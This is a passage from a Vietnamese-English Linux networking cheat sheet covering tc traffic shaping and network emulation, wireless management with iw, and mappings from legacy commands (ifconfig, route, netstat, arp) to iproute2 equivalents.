</span></span><span class=line><span class=cl><span class=k>-</span> fq_codel: Fair Queuing Controlled Delay (modern default)
</span></span><span class=line><span class=cl>- netem: Network emulator (add delay, loss, etc)</span></span></code></pre></div><h3 class=heading-element id=152-rate-limiting-với-tbf><span>15.2 Rate Limiting với tbf</span>
<a href=#152-rate-limiting-v%e1%bb%9bi-tbf class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Limit outgoing bandwidth to 1Mbit/s</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Parameters:</span>
</span></span><span class=line><span class=cl><span class=c1># rate:    Maximum rate</span>
</span></span><span class=line><span class=cl><span class=c1># burst:   Bucket size (max burst)</span>
</span></span><span class=line><span class=cl><span class=c1># latency: Maximum time packet can wait</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xem current qdisc</span>
</span></span><span class=line><span class=cl>tc qdisc show dev eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xóa qdisc</span>
</span></span><span class=line><span class=cl>tc qdisc del dev eth0 root
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Limit incoming (dùng ifb - intermediate functional block)</span>
</span></span><span class=line><span class=cl>modprobe ifb
</span></span><span class=line><span class=cl>ip link <span class=nb>set</span> dev ifb0 up
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 handle ffff: ingress
</span></span><span class=line><span class=cl>tc filter add dev eth0 parent ffff: protocol ip u32 match u32 <span class=m>0</span> <span class=m>0</span> action mirred egress redirect dev ifb0
</span></span><span class=line><span class=cl>tc qdisc add dev ifb0 root tbf rate 1mbit burst 32kbit latency 400ms</span></span></code></pre></div><h3 class=heading-element id=153-network-emulation-với-netem><span>15.3 Network Emulation với netem</span>
<a href=#153-network-emulation-v%e1%bb%9bi-netem class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Add latency</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root netem delay 100ms
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root netem delay 100ms 10ms    <span class=c1># 100ms ± 10ms jitter</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add packet loss</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root netem loss 1%             <span class=c1># 1% loss</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root netem loss 0.1% 25%       <span class=c1># 0.1% loss, 25% correlation</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add corruption</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root netem corrupt 0.1%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add duplication</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root netem duplicate 1%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add reordering</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root netem delay 10ms reorder 25% 50%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Combine multiple effects</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root netem delay 100ms 10ms loss 1% corrupt 0.1%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Show current</span>
</span></span><span class=line><span class=cl>tc qdisc show dev eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Remove</span>
</span></span><span class=line><span class=cl>tc qdisc del dev eth0 root
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Use case: Test application resilience to network issues</span></span></span></code></pre></div><hr><h2 class=heading-element id=phần-16-wireless---iw-iwconfig-deprecated><span>PHẦN 16: WIRELESS - IW (iwconfig DEPRECATED)</span>
<a href=#ph%e1%ba%a7n-16-wireless---iw-iwconfig-deprecated class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=161-iw-vs-iwconfig><span>16.1 iw vs iwconfig</span>
<a href=#161-iw-vs-iwconfig class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># iwconfig: Legacy wireless tool (DEPRECATED)</span>
</span></span><span class=line><span class=cl><span class=c1># iw: Modern nl80211-based tool</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Equivalents:</span>
</span></span><span class=line><span class=cl><span class=c1># iwconfig wlan0                    →  iw dev wlan0 link</span>
</span></span><span class=line><span class=cl><span class=c1># iwconfig wlan0 essid &#34;MyWiFi&#34;    →  iw dev wlan0 connect &#34;MyWiFi&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># iwconfig wlan0 channel 6         →  iw dev wlan0 set channel 6</span>
</span></span><span class=line><span class=cl><span class=c1># iwlist wlan0 scan                →  iw dev wlan0 scan</span></span></span></code></pre></div><h3 class=heading-element id=162-wireless-information><span>16.2 Wireless Information</span>
<a href=#162-wireless-information class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># List wireless interfaces</span>
</span></span><span class=line><span class=cl>iw dev
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Physical device info</span>
</span></span><span class=line><span class=cl>iw phy                           <span class=c1># All phy info</span>
</span></span><span class=line><span class=cl>iw phy phy0 info                 <span class=c1># Specific phy</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Link status</span>
</span></span><span class=line><span class=cl>iw dev wlan0 link
</span></span><span class=line><span class=cl><span class=c1># Connected to xx:xx:xx:xx:xx:xx (on wlan0)</span>
</span></span><span class=line><span class=cl><span class=c1>#     SSID: MyWiFi</span>
</span></span><span class=line><span class=cl><span class=c1>#     freq: 5180</span>
</span></span><span class=line><span class=cl><span class=c1>#     signal: -45 dBm</span>
</span></span><span class=line><span class=cl><span class=c1>#     tx bitrate: 867.0 MBit/s</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Station info</span>
</span></span><span class=line><span class=cl>iw dev wlan0 station dump
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Scan networks</span>
</span></span><span class=line><span class=cl>iw dev wlan0 scan
</span></span><span class=line><span class=cl>iw dev wlan0 scan <span class=p>|</span> grep -E <span class=s2>&#34;SSID|signal|freq&#34;</span></span></span></code></pre></div><h3 class=heading-element id=163-basic-operations><span>16.3 Basic Operations</span>
<a href=#163-basic-operations class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Bring interface up/down</span>
</span></span><span class=line><span class=cl>ip link <span class=nb>set</span> wlan0 up
</span></span><span class=line><span class=cl>ip link <span class=nb>set</span> wlan0 down
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set mode</span>
</span></span><span class=line><span class=cl>iw dev wlan0 <span class=nb>set</span> <span class=nb>type</span> managed     <span class=c1># Client mode (default)</span>
</span></span><span class=line><span class=cl>iw dev wlan0 <span class=nb>set</span> <span class=nb>type</span> monitor     <span class=c1># Monitor mode (packet capture)</span>
</span></span><span class=line><span class=cl>iw dev wlan0 <span class=nb>set</span> <span class=nb>type</span> ap          <span class=c1># Access point mode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Connect to open network</span>
</span></span><span class=line><span class=cl>iw dev wlan0 connect <span class=s2>&#34;OpenWiFi&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Disconnect</span>
</span></span><span class=line><span class=cl>iw dev wlan0 disconnect
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set channel (for monitor mode)</span>
</span></span><span class=line><span class=cl>iw dev wlan0 <span class=nb>set</span> channel <span class=m>6</span>
</span></span><span class=line><span class=cl>iw dev wlan0 <span class=nb>set</span> channel <span class=m>36</span> HT40+ <span class=c1># 5GHz with HT40</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># For WPA/WPA2, use wpa_supplicant hoặc NetworkManager (nmcli)</span>
</span></span><span class=line><span class=cl><span class=c1># iw không hỗ trợ encryption trực tiếp</span></span></span></code></pre></div><hr><h2 class=heading-element id=phần-17-legacy-commands-reference><span>PHẦN 17: LEGACY COMMANDS REFERENCE</span>
<a href=#ph%e1%ba%a7n-17-legacy-commands-reference class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=171-ifconfig-deprecated--ip><span>17.1 ifconfig (DEPRECATED → ip)</span>
<a href=#171-ifconfig-deprecated--ip class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ifconfig đã deprecated từ 2009</span>
</span></span><span class=line><span class=cl><span class=c1># Vẫn còn phổ biến trong tutorials cũ và một số distros</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Mapping ifconfig → ip:</span>
</span></span><span class=line><span class=cl>ifconfig                          →  ip addr show
</span></span><span class=line><span class=cl>ifconfig eth0                     →  ip addr show dev eth0
</span></span><span class=line><span class=cl>ifconfig eth0 up                  →  ip link <span class=nb>set</span> eth0 up
</span></span><span class=line><span class=cl>ifconfig eth0 down                →  ip link <span class=nb>set</span> eth0 down
</span></span><span class=line><span class=cl>ifconfig eth0 192.168.1.10        →  ip addr add 192.168.1.10/24 dev eth0
</span></span><span class=line><span class=cl>ifconfig eth0 192.168.1.10 netmask 255.255.255.0  →  ip addr add 192.168.1.10/24 dev eth0
</span></span><span class=line><span class=cl>ifconfig eth0 hw ether XX:XX:XX   →  ip link <span class=nb>set</span> eth0 address XX:XX:XX
</span></span><span class=line><span class=cl>ifconfig eth0:0 192.168.1.11      →  ip addr add 192.168.1.11/24 dev eth0 label eth0:0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ifconfig limitations:</span>
</span></span><span class=line><span class=cl><span class=c1># - Không hỗ trợ multiple IPs trên 1 interface tốt</span>
</span></span><span class=line><span class=cl><span class=c1># - Không hỗ trợ IPv6 đầy đủ</span>
</span></span><span class=line><span class=cl><span class=c1># - Không hỗ trợ network namespaces</span></span></span></code></pre></div><h3 class=heading-element id=172-route-deprecated--ip-route><span>17.2 route (DEPRECATED → ip route)</span>
<a href=#172-route-deprecated--ip-route class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Mapping route → ip route:</span>
</span></span><span class=line><span class=cl>route                             →  ip route show
</span></span><span class=line><span class=cl>route -n                          →  ip route show
</span></span><span class=line><span class=cl>route add default gw 192.168.1.1  →  ip route add default via 192.168.1.1
</span></span><span class=line><span class=cl>route add -net 10.0.0.0/8 gw 192.168.1.1  →  ip route add 10.0.0.0/8 via 192.168.1.1
</span></span><span class=line><span class=cl>route del default                 →  ip route del default
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># route limitations:</span>
</span></span><span class=line><span class=cl><span class=c1># - Không hỗ trợ advanced routing features</span>
</span></span><span class=line><span class=cl><span class=c1># - Không hỗ trợ policy routing</span></span></span></code></pre></div><h3 class=heading-element id=173-netstat-deprecated--ss><span>17.3 netstat (DEPRECATED → ss)</span>
<a href=#173-netstat-deprecated--ss class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># netstat đã deprecated, thay bằng ss</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Mapping netstat → ss:</span>
</span></span><span class=line><span class=cl>netstat -tuln                     →  ss -tuln
</span></span><span class=line><span class=cl>netstat -tulnp                    →  ss -tulnp
</span></span><span class=line><span class=cl>netstat -an                       →  ss -an
</span></span><span class=line><span class=cl>netstat -r                        →  ip route show <span class=o>(</span>hoặc routel<span class=o>)</span>
</span></span><span class=line><span class=cl>netstat -i                        →  ip -s link show
</span></span><span class=line><span class=cl>netstat -g                        →  ip maddr show
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># netstat limitations:</span>
</span></span><span class=line><span class=cl><span class=c1># - Chậm hơn ss (đọc /proc files vs netlink)</span>
</span></span><span class=line><span class=cl><span class=c1># - Output format khó parse</span></span></span></code></pre></div><h3 class=heading-element id=174-arp-deprecated--ip-neigh><span>17.4 arp (DEPRECATED → ip neigh)</span>
<a href=#174-arp-deprecated--ip-neigh class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Mapping arp → ip neigh:</span>
</span></span><span class=line><span class=cl>arp                               →  ip neigh show
</span></span><span class=line><span class=cl>arp -a                            →  ip neigh show
</span></span><span class=line><span class=cl>arp -n                            →  ip neigh show
</span></span><span class=line><span class=cl>arp -s 192.168.1.10 XX:XX:XX      →  ip neigh add 192.168.1.10 lladdr XX:XX:XX dev eth0
</span></span><span class=line><span class=cl>arp -d 192.168.1.10               →  ip neigh del 192.168.1.10 dev eth0</span></span></code></pre></div><h3 class=heading-element id=175-iwconfig-deprecated--iw><span>17.5 iwconfig (DEPRECATED → iw)</span>
<a href=#175-iwconfig-deprecated--iw class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Đã cover ở phần Wireless</span>
</span></span><span class=line><span class=cl><span class=c1># Dùng iw thay thế</span>
</span></span><span class=line><span class=cl><span class=c1># Hoặc dùng nmcli cho WiFi management (recommended)</span></span></span></code></pre></div><h3 class=heading-element id=176-summary-legacy--modern><span>17.6 Summary: Legacy → Modern</span>
<a href=#176-summary-legacy--modern class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────┬─────────────────┬────────────────────────┐
</span></span><span class=line><span class=cl>│ Legacy Command  │ Modern Command  │ Package                │
</span></span><span class=line><span class=cl>├─────────────────┼─────────────────┼────────────────────────┤
</span></span><span class=line><span class=cl>│ ifconfig        │ ip addr/link    │ iproute2               │
</span></span><span class=line><span class=cl>│ route           │ ip route        │ iproute2               │
</span></span><span class=line><span class=cl>│ netstat         │ ss              │ iproute2               │
</span></span><span class=line><span class=cl>│ arp             │ ip neigh        │ iproute2               │
</span></span><span class=line><span class=cl>│ iptables        │ nft / firewalld │ nftables / firewalld   │
</span></span><span class=line><span class=cl>│ iwconfig        │ iw              │ iw                     │
</span></span><span class=line><span class=cl>│ brctl           │ ip link bridge  │ iproute2               │
</span></span><span class=line><span class=cl>│ tunctl          │ ip tuntap       │ iproute2               │
</span></span><span class=line><span class=cl>│ nameif          │ ip link set name│ iproute2               │
</span></span><span class=line><span class=cl>│ mii-tool        │ ethtool         │ ethtool                │
</span></span><span class=line><span class=cl>└─────────────────┴─────────────────┴────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Rule: Nếu thấy tutorial dùng legacy commands,
</span></span><span class=line><span class=cl>      tìm modern equivalent trong iproute2 package.</span></span></code></pre></div><hr><h2 class=heading-element id=tóm-tắt-nhanh><span>TÓM TẮT NHANH</span>
<a href=#t%c3%b3m-t%e1%ba%aft-nhanh class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=ip><span>ip</span>
<a href=#ip class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ip addr show                    <span class=c1># Xem IP</span>
</span></span><span class=line><span class=cl>ip route show                   <span class=c1># Xem routing</span>
</span></span><span class=line><span class=cl>ip link <span class=nb>set</span> eth0 up/down        <span class=c1># Bật/tắt interface</span>
</span></span><span class=line><span class=cl>ip addr add 192.168.1.10/24 dev eth0
</span></span><span class=line><span class=cl>ip route add default via 192.168.1.1</span></span></code></pre></div><h3 class=heading-element id=ssnetstat><span>ss/netstat</span>
<a href=#ssnetstat class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ss -tuln                        <span class=c1># TCP/UDP listening</span>
</span></span><span class=line><span class=cl>ss -tnp                         <span class=c1># TCP connections + process</span>
</span></span><span class=line><span class=cl>ss -tn state established        <span class=c1># Filter by state</span>
